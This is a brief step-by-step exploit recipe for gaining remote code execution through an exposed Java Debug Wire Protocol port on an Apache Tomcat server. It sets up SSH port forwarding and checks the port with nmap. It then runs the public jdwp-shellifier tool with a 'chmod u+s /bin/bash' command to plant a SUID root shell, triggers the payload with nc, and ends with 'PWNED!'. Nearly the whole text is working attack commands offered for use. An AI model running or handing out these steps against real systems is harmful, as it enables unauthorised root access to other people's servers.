### Java Debug Wire Protocol (JDWP) Remote Code Execution

### REQUIREMENTS: The apache tomcat server has the debugging enabled: jdwp=transport=dt_socket,address=localhost:8000,server=y

### Tools: https://github.com/IOActive/jdwp-shellifier

### STEPS:

#### 1) ss -tulpn (Verify that the debug service is running on the target machine on port 8000 and 8005 tomcat service)

#### 2) ssh -L 8888:127.0.0.1:8000 USER@TARGET_IP (If the service runs locally, do local port forwarding to have access to the service)

#### 3) sudo nmap -sC -sV -p 8888 127.0.0.1 (Verify that you have access to the service)

#### 4) Download the exploit

#### 5) python2 jdwp-shellifier.py -t 127.0.0.1 -p 8888 --cmd 'chmod u+s /bin/bash' (Run the exploit)

#### 6) Target session: nc localhost 8005 (Trigger a connection on target ssh session AFTER you run the exploit to trigger the RCE

#### 7) PWNED!
